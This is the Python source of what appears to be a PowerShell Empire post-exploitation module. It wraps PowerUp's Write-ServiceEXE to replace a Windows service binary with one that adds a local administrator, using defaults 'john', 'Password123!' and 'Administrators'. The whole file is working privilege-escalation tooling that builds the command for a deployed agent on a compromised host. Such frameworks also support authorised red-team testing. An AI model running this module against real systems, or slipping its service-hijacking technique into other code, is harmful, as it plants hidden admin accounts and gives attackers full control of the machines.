from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Write-ServiceEXE',

            'Author': ['@harmj0y'],

            'Description': ("Backs up a service's binary and replaces the original "
                            "with a binary that creates/adds a local administrator."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ServiceName' : {
                'Description'   :   "The service name to manipulate.",
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   "The username to add.",
                'Required'      :   False,
                'Value'         :   'john'
            },
            'Password' : {
                'Description'   :   "Password to set for the added user.",
                'Required'      :   False,
                'Value'         :   'Password123!'
            },
            'GroupName' : {
                'Description'   :   "Local group to add the user to.",
                'Required'      :   False,
                'Value'         :   'Administrators'
            },
            'Restore' : {
                'Description'   :   "Switch. Restore the original service binary.",
                'Required'      :   False,
                'Value'         :   ''                
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/powerup/PowerUp.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode


        if self.options['Restore']['Value'] != '':
            script += "Restore-ServiceEXE "
        else:
            script += "Write-ServiceEXE "

        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "restore":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value']) 

        return script
